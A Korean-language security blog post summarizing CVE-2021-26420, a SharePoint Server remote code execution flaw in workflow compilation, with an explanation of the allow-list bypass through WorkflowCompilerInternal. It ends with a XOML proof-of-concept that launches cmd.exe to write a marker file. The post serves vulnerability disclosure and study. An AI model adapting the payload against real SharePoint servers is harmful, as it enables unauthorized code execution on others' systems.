---
title: "[하루한줄] CVE-2021-26420: MS SharePoint Server 원격 코드 실행 취약점"
author: L0ch
tags: [L0ch, cve, ms, rce, cve-2021-26420]
categories: [1day1line]
date: 2021-10-23 14:00:00
cc: true
index_img: /img/1day1line.png
---

## URL

[CVE-2021-26420: REMOTE CODE EXECUTION IN SHAREPOINT VIA WORKFLOW COMPILATION](https://www.zerodayinitiative.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation)

## Target

- Microsoft SharePont Server

## Explain

Microsoft SharePoint Server의 원격 코드 실행 취약점인 CVE-2021-26420의 세부 정보가 공개되었습니다.

SharePoint WF(Workflow Foundation)은 모든 dependent type과 assembly가 `web.config` 파일에 정의된 `authorizedTypes` 리스트에서 인증된 경우에만 workflow를 실행합니다.

이러한 화이트리스트와 함께 허용된 네임스페이스임에도 위험하다고 판단되는 특정 Type을 차단하는 블랙리스트 또한 존재하는데, 일반적으로 SharePoint의 workflows는 제한된 컨텍스트에서 컴파일되지만`System.Workflow.ComponentModel.Compiler`의 `WorkflowCompiler` 클래스의 `Compile()` 메서드는 매개 변수를 기반으로 workflow를 컴파일하기 때문에 해커가 매개변수를 지정해 제한없는 새 컨텍스트를 만들 수 있어 `WorkflowCompiler`는 `web.config`의 `authorizedType`리스트에 의해 차단됩니다.

아래는 `WorkflowCompiler.Compile`의 .NET 코드입니다.

```c
// System.Workflow.ComponentModel.Compiler.WorkflowCompiler 
public WorkflowCompilerResults Compile(WorkflowCompilerParameters parameters, params string[] files) 
{ 
    /*...*/ 
    WorkflowCompilerInternal workflowCompilerInternal = (WorkflowCompilerInternal)appDomain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(WorkflowCompilerInternal).FullName); 
    WorkflowCompilerResults workflowCompilerResults= workflowCompilerInternal.Compile(parameters, files);
```

`WorkflowCompiler.Compile`이 대부분 `authorizedTypes` 목록에 의해 차단되지 않는 `WorkflowCompilerInternal` 클래스에서 구현됩니다. 또한 `System.Workflow` 네임스페이스에서 실행 가능하므로 `WorkflowCompilerInternal` 을 직접 호출하여 임의의 workflow를 컴파일할 수 있습니다.

아래 XOML 파일(Attck.xoml)로 임의의 코드 실행을 트리거할 수 있습니다. 해당 파일이 컴파일되면 `noCode` 플래그가 지정되지 않은 경우 원하는 .NET 명령을 실행합니다.

```xml
<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="MyWorkflow" xmlns:x="<http://schemas.microsoft.com/winfx/2006/xaml>" xmlns="<http://schemas.microsoft.com/winfx/2006/xaml/workflow>"> 
    <x:Code><![CDATA[ class Rce : SequentialWorkflowActivity 
    { 
        public Rce(){ 
            Object res=System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > c:/windows/temp/PoC_SPRCE02.txt"); 
        } 
    }    ]]></x:Code> 
</SequentialWorkflowActivity>
```